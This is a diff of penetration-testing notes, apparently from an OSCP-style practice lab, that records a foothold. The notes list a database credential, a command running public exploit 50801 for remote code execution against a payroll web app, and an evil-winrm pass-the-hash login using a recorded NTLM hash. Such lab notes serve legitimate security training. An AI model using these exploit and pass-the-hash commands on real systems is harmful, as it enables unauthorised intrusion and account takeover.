@@ -93,7 +93,7 @@ Host script results:
 2. nurhodelta:password (from db)
 3. 3306 is mysql | 3307 is maria db
 
-# Foothold
+## Foothold
 1. found rce by attendance payroll system 50801 exploit
    ```
    python3 50801.py http://ms01:81
@@ -194,9 +194,17 @@ Post-scan script results:
 |_    10.10.200.142
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 3 IP addresses (3 hosts up) scanned in 1293.43 seconds
-
-
 ```
+
+## Foothold
+1. found celia ntlm
+2. ```
+    evil-winrm -i 10.10.200.142 -u 'oscp.exam\celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'
+    ```
+
+## Root
+
+
 # DC01 .140
 - dc01.oscp.exam
 ```
